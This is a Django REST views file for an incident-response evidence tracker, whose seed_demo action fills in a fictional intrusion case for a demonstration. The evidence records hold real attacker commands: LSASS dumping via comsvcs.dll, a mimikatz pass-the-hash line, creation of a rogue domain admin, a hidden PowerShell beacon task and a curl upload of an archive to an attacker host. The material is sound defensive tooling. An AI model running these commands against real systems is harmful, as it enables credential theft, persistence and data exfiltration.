import io
from datetime import datetime, timezone as dt_timezone
from django.http import HttpResponse
from django.core.files.base import ContentFile
from django.utils import timezone
from PIL import Image as PilImage, ImageDraw
from rest_framework import viewsets, status
from rest_framework.decorators import action
from rest_framework.exceptions import PermissionDenied
from rest_framework.parsers import MultiPartParser, FormParser, JSONParser
from rest_framework.response import Response
from rest_framework.views import APIView

from .models import (
    Project,
    ExternalResearch,
    EvidenceItem,
    EvidenceScreenshot,
    get_user_display_name,
)
from .permissions import (
    ProjectAccessPermission,
    InvestigationItemPermission,
    assert_project_unlocked,
)
from .serializers import (
    ProjectSerializer,
    ExternalResearchSerializer,
    EvidenceItemSerializer,
    EvidenceScreenshotSerializer,
)
from .reports import (
    generate_timeline_csv,
    generate_key_evidence_odt,
    generate_key_evidence_markdown,
)


def _create_sample_terminal_screenshot(title: str, lines: list[str]) -> bytes:
    """Generates a realistic terminal/SIEM screenshot PNG for demo evidence."""
    img = PilImage.new("RGB", (820, 320), color=(12, 21, 40))
    draw = ImageDraw.Draw(img)
    draw.rectangle([(0, 0), (820, 36)], fill=(0, 19, 56))
    draw.text((20, 11), title, fill=(241, 245, 249))

    y = 54
    for line in lines:
        draw.text((20, y), line, fill=(203, 213, 225))
        y += 24

    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


class ProjectViewSet(viewsets.ModelViewSet):
    queryset = Project.objects.select_related('locked_by').all()
    serializer_class = ProjectSerializer
    permission_classes = [ProjectAccessPermission]

    def perform_create(self, serializer):
        lead = (serializer.validated_data.get('lead_analyst') or '').strip()
        if not lead:
            lead = get_user_display_name(self.request.user)
        serializer.save(lead_analyst=lead)

    def perform_update(self, serializer):
        assert_project_unlocked(serializer.instance)
        serializer.save()

    def perform_destroy(self, instance):
        if instance.is_locked:
            raise PermissionDenied(
                "Cannot delete a locked project. Unlock the project first if you intend to delete it."
            )
        instance.delete()

    @action(detail=True, methods=['post'])
    def lock(self, request, pk=None):
        project = self.get_object()
        if not project.is_locked:
            project.is_locked = True
            project.locked_by = request.user
            project.locked_at = timezone.now()
            project.save(update_fields=['is_locked', 'locked_by', 'locked_at', 'updated_at'])
        return Response(self.get_serializer(project).data)

    @action(detail=True, methods=['post'])
    def unlock(self, request, pk=None):
        project = self.get_object()
        if project.is_locked:
            project.is_locked = False
            project.locked_by = None
            project.locked_at = None
            project.save(update_fields=['is_locked', 'locked_by', 'locked_at', 'updated_at'])
        return Response(self.get_serializer(project).data)

    @action(detail=True, methods=['get'])
    def timeline(self, request, pk=None):
        project = self.get_object()
        items = project.get_timeline_evidence()
        serializer = EvidenceItemSerializer(items, many=True)
        return Response(serializer.data)

    @action(detail=True, methods=['get'])
    def report_csv(self, request, pk=None):
        """
        Report One: Generates and downloads a time-ordered CSV report of ALL evidence.
        """
        project = self.get_object()
        csv_content, _ = generate_timeline_csv(project)
        project.sync_archive_manifest()
        filename = f"incident_{project.pk}_evidence_timeline.csv"
        response = HttpResponse(csv_content, content_type="text/csv; charset=utf-8")
        response["Content-Disposition"] = f'attachment; filename="{filename}"'
        return response

    @action(detail=True, methods=['get'])
    def report_odt(self, request, pk=None):
        """
        Report Two (ODT): Generates and downloads a concise OpenDocument Text (.odt) report
        of ONLY Key Evidence items, time-ordered, with embedded screenshots, links, and summary tables.
        """
        project = self.get_object()
        odt_bytes, _ = generate_key_evidence_odt(project)
        project.sync_archive_manifest()
        filename = f"incident_{project.pk}_key_evidence_report.odt"
        response = HttpResponse(
            odt_bytes,
            content_type="application/vnd.oasis.opendocument.text",
        )
        response["Content-Disposition"] = f'attachment; filename="{filename}"'
        return response

    @action(detail=True, methods=['get'])
    def report_md(self, request, pk=None):
        """
        Report Two (Markdown): Creates the dedicated screenshot folder alongside the Markdown report
        and downloads either the .md file or a .zip bundle (containing the .md + screenshot folder)
        when ?bundle=zip is passed.
        """
        project = self.get_object()
        md_content, _, zip_bytes = generate_key_evidence_markdown(project)
        project.sync_archive_manifest()
        if request.query_params.get("bundle") == "zip":
            filename = f"incident_{project.pk}_key_evidence_markdown_with_screenshots.zip"
            response = HttpResponse(zip_bytes, content_type="application/zip")
            response["Content-Disposition"] = f'attachment; filename="{filename}"'
            return response

        filename = f"incident_{project.pk}_key_evidence_report.md"
        response = HttpResponse(md_content, content_type="text/markdown; charset=utf-8")
        response["Content-Disposition"] = f'attachment; filename="{filename}"'
        return response

    @action(detail=False, methods=['post'])
    def seed_demo(self, request):
        """
        Creates a comprehensive sample SOC Incident Response project with:
          - Analysts: Chrisjen Avasarala and James Holden
          - 20 total events (Atomic + Search Result)
          - 7 Key Evidence events (with generated screenshots and MITRE mappings)
          - Individually removable ExternalResearch entries
        """
        project = Project.objects.create(
            title="Unauthorized VPN Intrusion, Active Directory Compromise & Data Exfiltration",
            customer_name="Tycho Manufacturing & Logistics",
            customer_id="CUST-90421",
            ticket_id="SOC-2026-9041",
            ticket_link="https://soc.internal.example/tickets/SOC-2026-9041",
            summary=(
                "Threat actor compromised perimeter SSL-VPN gateway VPN-GW-01 via password spraying, "
                "pivoted over WinRM/SMB to application server WIN-WEB-04 and file server FS-CORP-02, "
                "dumped LSASS credentials, created rogue Domain Admin account svc_backup_adm on DC-PROD-01, "
                "deployed a scheduled task beacon to c2.ceres-telemetry.net, and staged encrypted 7-Zip "
                "archives before containment."
            ),
            key_assets_affected=(
                "VPN-GW-01 (10.10.1.5)\n"
                "WIN-WEB-04 (10.20.4.18)\n"
                "FS-CORP-02 (10.20.8.22)\n"
                "SQL-FIN-01 (10.20.12.50)\n"
                "DC-PROD-01 (10.20.0.10)"
            ),
            key_users_affected=(
                "TYCHO\\j.miller\n"
                "TYCHO\\svc_iis_pool\n"
                "TYCHO\\adm_k.nagata\n"
                "TYCHO\\svc_backup_adm (Created by Attacker)"
            ),
            key_malicious_indicators=(
                "185.220.101.44\n"
                "91.214.124.88\n"
                "45.155.205.109\n"
                "cdn-update-telemetry.net\n"
                "c2.ceres-telemetry.net\n"
                "stage.7z\n"
                "comsvcs.dll\n"
                "updater_svc.ps1"
            ),
            status="INVESTIGATING",
            lead_analyst="Chrisjen Avasarala",
        )

        # Removable External Research Items
        ExternalResearch.objects.create(
            project=project,
            link="https://attack.mitre.org/techniques/T1110/003/",
            summary="MITRE ATT&CK T1110.003 - Password Spraying against perimeter SSL-VPN gateways.",
            analyst_name="Chrisjen Avasarala",
        )
        ExternalResearch.objects.create(
            project=project,
            link="https://attack.mitre.org/techniques/T1003/001/",
            summary="MITRE ATT&CK T1003.001 - OS Credential Dumping: LSASS Memory via rundll32 comsvcs.dll MiniDump.",
            analyst_name="James Holden",
        )
        ExternalResearch.objects.create(
            project=project,
            link="https://attack.mitre.org/techniques/T1136/002/",
            summary="MITRE ATT&CK T1136.002 - Create Account: Domain Account persistence pattern.",
            analyst_name="Chrisjen Avasarala",
        )

        events_spec = [
            # 1 - Standard
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 0, 45, 12, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "VPN-GW-01 (10.10.1.5)",
                "user": "",
                "attacker_user": False,
                "summary": "External port & SSL/TLS cipher enumeration scan against VPN-GW-01 from 45.155.205.109.",
                "notes": "Pre-attack reconnaissance identifying SSL-VPN login portal endpoints.",
                "indicators": "45.155.205.109",
                "cmd": "",
                "tactic": "Reconnaissance (TA0043)",
                "technique": "T1595.002 - Active Scanning: Vulnerability Scanning",
                "log_link": "https://ids.internal.example/alerts/suricata-900101",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            # 2 - KEY #1 (Search Result)
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 1, 12, 0, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 17, 1, 34, 15, tzinfo=dt_timezone.utc),
                "asset": "VPN-GW-01 (10.10.1.5)",
                "user": "TYCHO\\j.miller",
                "attacker_user": False,
                "summary": "Sustained password spray (412 failed logins followed by 1 success) from 185.220.101.44 targeting TYCHO\\j.miller.",
                "notes": "MFA push fatigue suspected; user accepted prompt at 01:34:15 UTC and was assigned VPN pool IP 10.10.99.104.",
                "indicators": "185.220.101.44",
                "cmd": "",
                "tactic": "Initial Access (TA0001)",
                "technique": "T1110.003 - Brute Force: Password Spraying",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/vpn-spray-20261017",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(event.dataset:vpn.auth%20AND%20source.ip:185.220.101.44)",
                "key": True,
                "shot": (
                    "vpn_credential_spray.png",
                    "SIEM Query: VPN Auth Spray (01:12:00 - 01:34:15 UTC)",
                    [
                        "[SIEM] index=vpn_logs src_ip=185.220.101.44 | stats count by action, user",
                        "01:12:04 - 01:33:58 UTC | action=failure | count=412 | user=TYCHO\\j.miller",
                        "01:34:15 UTC            | action=success | count=1   | user=TYCHO\\j.miller",
                        "Assigned VPN Pool IP: 10.10.99.104",
                    ],
                ),
            },
            # 3 - Standard
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 1, 36, 40, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "VPN-GW-01 (10.10.1.5)",
                "user": "TYCHO\\j.miller",
                "attacker_user": False,
                "summary": "SSL-VPN tunnel session established and internal DNS resolver queried for _ldap._tcp.dc._msdcs.",
                "notes": "Immediate Active Directory domain controller discovery upon VPN connection.",
                "indicators": "185.220.101.44, 10.10.99.104",
                "cmd": "nslookup -type=SRV _ldap._tcp.dc._msdcs.tycho.local",
                "tactic": "Discovery (TA0007)",
                "technique": "T1018 - Remote System Discovery",
                "log_link": "https://siem.internal.example/events/dns-441092",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            # 4 - Standard
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 1, 39, 10, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 17, 1, 43, 55, tzinfo=dt_timezone.utc),
                "asset": "WIN-WEB-04 (10.20.4.18)",
                "user": "TYCHO\\j.miller",
                "attacker_user": False,
                "summary": "Internal TCP SYN scan from VPN client 10.10.99.104 across 10.20.4.0/24 targeting ports 445, 3389, and 5985.",
                "notes": "Suricata IDS alerted on rapid SMB/WinRM port sweep.",
                "indicators": "10.10.99.104",
                "cmd": "nmap -sS -p 445,3389,5985 10.20.4.0/24",
                "tactic": "Discovery (TA0007)",
                "technique": "T1046 - Network Service Discovery",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/internal-port-sweep",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(source.ip:10.10.99.104%20AND%20destination.port:(445%20OR%205985))",
                "key": False,
                "shot": None,
            },
            # 5 - KEY #2 (Atomic Event - Lateral Movement to WIN-WEB-04, no screenshot)
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 1, 46, 18, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WIN-WEB-04 (10.20.4.18)",
                "user": "TYCHO\\j.miller",
                "attacker_user": False,
                "summary": "Remote PowerShell WinRM session (Event ID 4624 Type 3 & Microsoft-Windows-WinRM/Operational EID 91) established to WIN-WEB-04.",
                "notes": "Attacker used compromised j.miller credentials to pivot from VPN pool to application server WIN-WEB-04.",
                "indicators": "10.10.99.104, 10.20.4.18",
                "cmd": "Enter-PSSession -ComputerName WIN-WEB-04 -Credential TYCHO\\j.miller",
                "tactic": "Lateral Movement (TA0008)",
                "technique": "T1021.006 - Remote Services: Windows Remote Management",
                "log_link": "https://siem.internal.example/events/winrm-eid91-552019",
                "res_link": "",
                "qry_link": "",
                "key": True,
                "shot": None,
            },
            # 6 - Standard
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 1, 48, 0, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WIN-WEB-04 (10.20.4.18)",
                "user": "TYCHO\\j.miller",
                "attacker_user": False,
                "summary": "Local host & privilege enumeration commands executed inside wsmprovhost.exe on WIN-WEB-04.",
                "notes": "Attacker checked local group memberships and active sessions.",
                "indicators": "10.20.4.18",
                "cmd": "whoami /all && net localgroup administrators && query user",
                "tactic": "Discovery (TA0007)",
                "technique": "T1033 - System Owner/User Discovery",
                "log_link": "https://edr.internal.example/events/sysmon-eid1-771022",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            # 7 - Standard
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 1, 51, 33, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WIN-WEB-04 (10.20.4.18)",
                "user": "TYCHO\\j.miller",
                "attacker_user": False,
                "summary": "PowerShell script-block logging (Event ID 4104) captured AMSI bypass attempt and Defender exclusion check.",
                "notes": "Attempted to disable real-time monitoring prior to credential dumping.",
                "indicators": "10.20.4.18",
                "cmd": "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath",
                "tactic": "Defense Evasion (TA0005)",
                "technique": "T1562.001 - Impair Defenses: Disable or Modify Tools",
                "log_link": "https://siem.internal.example/events/ps-eid4104-771290",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            # 8 - KEY #3 (Atomic Event - LSASS Credential Dumping)
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 1, 55, 10, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WIN-WEB-04 (10.20.4.18)",
                "user": "TYCHO\\j.miller",
                "attacker_user": False,
                "summary": "EDR Sysmon Event ID 1 & 10: rundll32 comsvcs.dll MiniDump executed on WIN-WEB-04 to dump LSASS process memory.",
                "notes": "Domain Admin token for TYCHO\\adm_k.nagata extracted from cached interactive session on WIN-WEB-04.",
                "indicators": "185.220.101.44, 10.20.4.18, comsvcs.dll, debug.bin",
                "cmd": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\debug.bin full",
                "tactic": "Credential Access (TA0006)",
                "technique": "T1003.001 - OS Credential Dumping: LSASS Memory",
                "log_link": "https://edr.internal.example/events/sysmon-eid10-882741",
                "res_link": "",
                "qry_link": "",
                "key": True,
                "shot": (
                    "lsass_minidump_edr.png",
                    "EDR Telemetry: LSASS Access via comsvcs.dll on WIN-WEB-04",
                    [
                        "[EDR] host=WIN-WEB-04 EventCode IN (1, 10) TargetImage=*lsass.exe",
                        "$ rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\debug.bin full",
                        "GrantedAccess=0x1fffff | CallTrace=comsvcs.dll+0x241a0",
                    ],
                ),
            },
            # 9 - Standard
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 1, 58, 42, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WIN-WEB-04 (10.20.4.18)",
                "user": "TYCHO\\j.miller",
                "attacker_user": False,
                "summary": "Sysmon Event ID 23 (FileDelete): C:\\Windows\\Temp\\debug.bin removed after credential extraction.",
                "notes": "Attacker deleted the raw LSASS dump file after parsing credentials.",
                "indicators": "debug.bin",
                "cmd": "Remove-Item -Path C:\\Windows\\Temp\\debug.bin -Force",
                "tactic": "Defense Evasion (TA0005)",
                "technique": "T1070.004 - Indicator Removal: File Deletion",
                "log_link": "https://edr.internal.example/events/sysmon-eid23-882910",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            # 10 - Standard
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 2, 1, 15, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WIN-WEB-04 (10.20.4.18)",
                "user": "TYCHO\\svc_iis_pool",
                "attacker_user": False,
                "summary": "IIS application pool configuration inspected to extract connection strings for SQL-FIN-01.",
                "notes": "Read web.config from C:\\inetpub\\wwwroot\\portal\\web.config.",
                "indicators": "10.20.4.18, web.config",
                "cmd": "type C:\\inetpub\\wwwroot\\portal\\web.config | findstr /i connectionString",
                "tactic": "Credential Access (TA0006)",
                "technique": "T1552.001 - Unsecured Credentials: Credentials In Files",
                "log_link": "https://edr.internal.example/events/sysmon-eid1-883104",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            # 11 - KEY #4 (Search Result - Pass-the-Hash Lateral Movement to DC-PROD-01)
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 2, 4, 0, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 17, 2, 8, 30, tzinfo=dt_timezone.utc),
                "asset": "DC-PROD-01 (10.20.0.10)",
                "user": "TYCHO\\adm_k.nagata",
                "attacker_user": False,
                "summary": "Pass-the-Hash NTLM network logons (Event ID 4624 LogonType 3, AuthPackage NTLM) from WIN-WEB-04 to DC-PROD-01 and FS-CORP-02 using stolen adm_k.nagata hash.",
                "notes": "Anomalous NTLM authentication across tier-0 domain controller from web tier.",
                "indicators": "10.20.4.18, 10.20.0.10",
                "cmd": "sekurlsa::pth /user:adm_k.nagata /domain:tycho.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c",
                "tactic": "Lateral Movement (TA0008)",
                "technique": "T1550.002 - Use Alternate Authentication Material: Pass the Hash",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/pth-ntlm-dc-logons",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(event.code:4624%20AND%20winlog.event_data.AuthenticationPackageName:NTLM%20AND%20user.name:adm_k.nagata)",
                "key": True,
                "shot": (
                    "pth_ntlm_lateral_movement.png",
                    "SIEM Search: Pass-the-Hash NTLM Logons to DC-PROD-01",
                    [
                        "[SIEM] EventCode=4624 LogonType=3 AuthPackage=NTLM src_ip=10.20.4.18",
                        "02:04:12 UTC | dest=DC-PROD-01 | user=TYCHO\\adm_k.nagata | NTLMv2",
                        "02:06:48 UTC | dest=FS-CORP-02 | user=TYCHO\\adm_k.nagata | NTLMv2",
                    ],
                ),
            },
            # 12 - Standard
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 2, 9, 10, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "DC-PROD-01 (10.20.0.10)",
                "user": "TYCHO\\adm_k.nagata",
                "attacker_user": False,
                "summary": "Active Directory enterprise admin and domain trust enumeration executed on DC-PROD-01.",
                "notes": "Attacker enumerated privileged groups before creating persistence account.",
                "indicators": "10.20.0.10",
                "cmd": "net group \"Domain Admins\" /domain && nltest /domain_trusts",
                "tactic": "Discovery (TA0007)",
                "technique": "T1069.002 - Permission Groups Discovery: Domain Groups",
                "log_link": "https://edr.internal.example/events/sysmon-eid1-900112",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            # 13 - KEY #5 (Search Result - Rogue Domain Admin Account Creation)
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 2, 11, 5, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 17, 2, 14, 20, tzinfo=dt_timezone.utc),
                "asset": "DC-PROD-01 (10.20.0.10)",
                "user": "TYCHO\\svc_backup_adm",
                "attacker_user": True,
                "summary": "Attacker created rogue account 'svc_backup_adm' (Event ID 4720) and added it to Domain Admins (Event ID 4728) on DC-PROD-01.",
                "notes": "Confirmed unauthorized service account created for domain persistence.",
                "indicators": "10.20.0.10",
                "cmd": "net user svc_backup_adm P@ssw0rd2026! /add /domain\nnet group \"Domain Admins\" svc_backup_adm /add /domain",
                "tactic": "Persistence (TA0003)",
                "technique": "T1136.002 - Create Account: Domain Account",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/dc-rogue-account-4720",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(host.name:DC-PROD-01%20AND%20event.code:(4720%20OR%204728))",
                "key": True,
                "shot": (
                    "rogue_domain_admin_creation.png",
                    "Domain Controller Security Audit: Event ID 4720 & 4728",
                    [
                        "[SIEM] host=DC-PROD-01 EventID IN (4720, 4728) TargetUserName=svc_backup_adm",
                        "02:11:09 UTC | EventID=4720 (User Account Created)  | Target=svc_backup_adm",
                        "02:11:18 UTC | EventID=4728 (Added to Global Group) | Group=Domain Admins",
                    ],
                ),
            },
            # 14 - KEY #6 (Atomic Event - Scheduled Task C2 Beacon Persistence, no screenshot)
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 2, 16, 45, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "DC-PROD-01 (10.20.0.10)",
                "user": "TYCHO\\svc_backup_adm",
                "attacker_user": True,
                "summary": "Scheduled task 'WindowsTelemetrySync' registered (Event ID 4698) to execute C:\\ProgramData\\updater_svc.ps1 every 15 minutes.",
                "notes": "Script beacons over HTTPS to c2.ceres-telemetry.net (45.155.205.109).",
                "indicators": "45.155.205.109, c2.ceres-telemetry.net, updater_svc.ps1",
                "cmd": "schtasks /create /tn \"WindowsTelemetrySync\" /tr \"powershell.exe -ep bypass -w hidden -f C:\\ProgramData\\updater_svc.ps1\" /sc minute /mo 15 /ru SYSTEM",
                "tactic": "Persistence (TA0003)",
                "technique": "T1053.005 - Scheduled Task/Job: Scheduled Task",
                "log_link": "https://siem.internal.example/events/sec-eid4698-900451",
                "res_link": "",
                "qry_link": "",
                "key": True,
                "shot": None,
            },
            # 15 - Standard
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 2, 18, 0, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 17, 2, 22, 10, tzinfo=dt_timezone.utc),
                "asset": "FS-CORP-02 (10.20.8.22)",
                "user": "TYCHO\\svc_backup_adm",
                "attacker_user": True,
                "summary": "High-volume SMB file reads on \\\\FS-CORP-02\\Engineering$ and \\\\FS-CORP-02\\Finance$ shares.",
                "notes": "Event ID 5145 shows recursive directory listing and read access to sensitive schematics.",
                "indicators": "10.20.8.22",
                "cmd": "",
                "tactic": "Collection (TA0009)",
                "technique": "T1039 - Data from Network Shared Drive",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/smb-share-collection-5145",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(host.name:FS-CORP-02%20AND%20event.code:5145%20AND%20user.name:svc_backup_adm)",
                "key": False,
                "shot": None,
            },
            # 16 - Standard
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 2, 23, 5, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "SQL-FIN-01 (10.20.12.50)",
                "user": "TYCHO\\svc_backup_adm",
                "attacker_user": True,
                "summary": "sqlcmd utility executed on SQL-FIN-01 to export customer billing table to CSV.",
                "notes": "Exported 14,200 customer records to temporary staging folder.",
                "indicators": "10.20.12.50, billing_dump.csv",
                "cmd": "sqlcmd -S localhost -Q \"SELECT * FROM FinanceDB.dbo.CustomerBilling\" -o C:\\Windows\\Temp\\billing_dump.csv -s\",\"",
                "tactic": "Collection (TA0009)",
                "technique": "T1005 - Data from Local System",
                "log_link": "https://edr.internal.example/events/sysmon-eid1-901220",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            # 17 - Standard
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 2, 24, 50, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "DC-PROD-01 (10.20.0.10)",
                "user": "TYCHO\\svc_backup_adm",
                "attacker_user": True,
                "summary": "7-Zip command-line binary used to compress collected shares and database dump into password-protected archive stage.7z.",
                "notes": "Archive size approximately 480 MB staged in C:\\Windows\\Temp\\stage.7z.",
                "indicators": "stage.7z, 7za.exe",
                "cmd": "C:\\Windows\\Temp\\7za.exe a -p8891aK! C:\\Windows\\Temp\\stage.7z C:\\Windows\\Temp\\collected\\*",
                "tactic": "Collection (TA0009)",
                "technique": "T1560.001 - Archive Collected Data: Archive via Utility",
                "log_link": "https://edr.internal.example/events/sysmon-eid1-901588",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            # 18 - KEY #7 (Search Result - Outbound Exfiltration over HTTPS)
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 2, 26, 10, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 17, 2, 29, 45, tzinfo=dt_timezone.utc),
                "asset": "DC-PROD-01 (10.20.0.10)",
                "user": "TYCHO\\svc_backup_adm",
                "attacker_user": True,
                "summary": "Outbound HTTPS POST transfer of C:\\Windows\\Temp\\stage.7z to cdn-update-telemetry.net (91.214.124.88:443).",
                "notes": "Firewall flow logs show 112 MB transferred before egress block rule triggered.",
                "indicators": "91.214.124.88, cdn-update-telemetry.net, stage.7z",
                "cmd": "curl.exe -X POST https://cdn-update-telemetry.net/upload -F file=@C:\\Windows\\Temp\\stage.7z",
                "tactic": "Exfiltration (TA0010)",
                "technique": "T1041 - Exfiltration Over C2 Channel",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/egress-https-exfil-91-214-124-88",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(destination.ip:91.214.124.88%20AND%20source.ip:10.20.0.10)",
                "key": True,
                "shot": (
                    "https_exfiltration_flow.png",
                    "Firewall & Proxy Telemetry: HTTPS Exfiltration to 91.214.124.88",
                    [
                        "[SIEM] src_ip=10.20.0.10 dest_ip=91.214.124.88 sni=cdn-update-telemetry.net",
                        "$ curl.exe -X POST https://cdn-update-telemetry.net/upload -F file=@C:\\Windows\\Temp\\stage.7z",
                        "BytesSent=117440512 | Action=ConnectionResetByFirewall (02:29:45 UTC)",
                    ],
                ),
            },
            # 19 - Standard
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 2, 31, 0, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "DC-PROD-01 (10.20.0.10)",
                "user": "TYCHO\\svc_backup_adm",
                "attacker_user": True,
                "summary": "Periodic PowerShell C2 beacon attempt from updater_svc.ps1 to c2.ceres-telemetry.net blocked at perimeter firewall.",
                "notes": "Confirmed scheduled task persistence attempted callback after exfiltration interruption.",
                "indicators": "45.155.205.109, c2.ceres-telemetry.net, updater_svc.ps1",
                "cmd": "powershell.exe -ep bypass -w hidden -f C:\\ProgramData\\updater_svc.ps1",
                "tactic": "Command and Control (TA0011)",
                "technique": "T1071.001 - Application Layer Protocol: Web Protocols",
                "log_link": "https://siem.internal.example/events/fw-drop-902114",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            # 20 - Standard
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 2, 35, 20, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "DC-PROD-01 (10.20.0.10)",
                "user": "TYCHO\\svc_backup_adm",
                "attacker_user": True,
                "summary": "SOC containment executed: rogue account svc_backup_adm disabled (Event ID 4725), scheduled task removed, and WIN-WEB-04 isolated in EDR.",
                "notes": "Password resets enforced for j.miller and adm_k.nagata; active VPN sessions terminated.",
                "indicators": "185.220.101.44, 91.214.124.88, 45.155.205.109",
                "cmd": "",
                "tactic": "",
                "technique": "",
                "log_link": "https://soc.internal.example/tickets/SOC-2026-9041/containment-log",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
        ]

        for spec in events_spec:
            ev = EvidenceItem.objects.create(
                project=project,
                evidence_type=spec["type"],
                analyst_name=spec["analyst"],
                timestamp=spec["ts"],
                end_timestamp=spec["end_ts"],
                summary=spec["summary"],
                affected_asset=spec["asset"],
                affected_user=spec["user"],
                user_created_by_attacker=spec["attacker_user"],
                malicious_hosts_ips=spec["indicators"],
                commands_run=spec["cmd"],
                mitre_tactic=spec["tactic"],
                mitre_technique=spec["technique"],
                related_log_link=spec["log_link"],
                search_result_link=spec["res_link"],
                search_query_link=spec["qry_link"],
                notes=spec["notes"],
                is_key_evidence=spec["key"],
            )
            if spec["shot"]:
                filename, title, lines = spec["shot"]
                png_bytes = _create_sample_terminal_screenshot(title, lines)
                shot = EvidenceScreenshot(
                    evidence=ev,
                    caption=title,
                    analyst_name=spec["analyst"],
                )
                shot.image.save(filename, ContentFile(png_bytes), save=True)

        generate_timeline_csv(project)
        generate_key_evidence_odt(project)
        generate_key_evidence_markdown(project)
        project.sync_archive_manifest()

        serializer = self.get_serializer(project)
        return Response(serializer.data, status=status.HTTP_201_CREATED)


class EvidenceItemViewSet(viewsets.ModelViewSet):
    queryset = EvidenceItem.objects.select_related('project').prefetch_related('screenshots').all()
    serializer_class = EvidenceItemSerializer
